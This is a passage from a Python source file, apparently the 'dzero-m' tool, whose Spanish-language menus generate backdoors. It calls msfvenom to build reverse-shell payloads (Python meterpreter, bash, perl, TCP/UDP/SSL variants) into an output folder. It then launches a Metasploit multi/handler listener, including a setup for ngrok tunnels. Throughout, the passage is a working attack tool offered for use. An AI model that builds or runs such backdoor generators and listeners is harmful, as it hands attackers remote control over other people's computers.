							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()		

			elif pay == '03':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()								
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()		

			elif pay == '04':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()								
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '05':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/shell_reverse_tcp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/shell_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()				
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '06':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/shell_reverse_tcp_ssl LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_tcp_ssl; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/shell_reverse_tcp_ssl; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()		

			elif pay == '07':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/shell_reverse_udp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_udp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/shell_reverse_udp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()		

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				main()	

		elif sys == '07':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} cmd/unix/reverse_bash'.format(WHITE, YELLOW))
			print ('{0}[02]{1} cmd/unix/reverse_bash_telnet_ssl'.format(WHITE, YELLOW))

			pay = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p cmd/unix/reverse_bash LHOST={0} LPORT={1} -f raw > output/{2}.sh'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.sh'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.sh".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()						
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_bash; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD cmd/unix/reverse_bash; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()						

			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p cmd/unix/reverse_bash_telnet_ssl LHOST={0} LPORT={1} -f raw > output/{2}.sh'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.sh'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.sh".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_bash_telnet_ssl; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD cmd/unix/reverse_bash_telnet_ssl; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()		

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				main()	

		elif sys == '08':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))			
			print ('{0}[01]{1} cmd/unix/reverse_perl'.format(WHITE, YELLOW))
			print ('{0}[02]{1} cmd/unix/reverse_perl_ssl'.format(WHITE, YELLOW))

			pay = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p cmd/unix/reverse_perl LHOST={0} LPORT={1} -f raw > output/{2}.pl'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.pl'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.pl".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_perl; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD cmd/unix/reverse_perl; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()			
				else:	
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()						
			
			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p cmd/unix/reverse_perl_ssl LHOST={0} LPORT={1} -f raw > output/{2}.pl'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.pl'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.pl".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_perl_ssl; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD cmd/unix/reverse_perl_ssl; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				main()

		elif sys == 9:
			LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
			LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
			PAYLOAD = raw_input("\n{0}SET PAYLOAD: {1}".format(YELLOW, DEFAULT))
			if ".tcp.ngrok.io" in LHOST:
				LHOST = "127.0.0.1"
				LPORT = "443"
			# continue
			os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {}; set LPORT {}; set PAYLOAD {}; exploit\'"'.format(LHOST, LPORT, PAYLOAD))
			pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
			os.system('clear')
			main() 

		else:
			print("\n{}[X] OPCION INVALIDA\n".format(RED))
			time.sleep(3)
			pause("{}Presione cualquier tecla para continuar...".format(GREEN))
			os.system('clear')
			main()

	elif option == '11':
		webbrowser.open("https://adrmxr.github.io/dzero-m", new=1, autoraise=True)
		os.system('clear')
		main()	

	elif option == '12':
		pause("\n{}Presione cualquier tecla para salir...".format(GREEN))
		time.sleep(1)
		os.system('clear')
		print(exit_main)
		exit(0)

	else:
		print("\n{}[X] OPCION INVALIDA\n".format(RED))
		time.sleep(3)
		os.system('clear')
		main()

if __name__ == "__main__":
	try:
		check_connection()
		check_permissions()
		main()

	except KeyboardInterrupt:
		choice = input('\n\n{0}[1] {1}Return dzero-m {0}[2] {1}Exit \n{2}dzero-m >> {1}'.format(GREEN, DEFAULT, RED))
		choice = choice.zfill(2)
		if choice == '01':
			if os.path.isfile('/usr/local/bin/dzero-m'):
				os.system('clear && dzero-m')
			else:
				os.system('clear && sudo python3 dzero-m.py')	

		elif choice == '02':
			time.sleep(2)
			os.system('clear')
			print(exit_main)
			exit(0)
		else:
			print("\n{}[x] Opcion invalida.".format(RED))
			time.sleep(2)	
			exit(0)
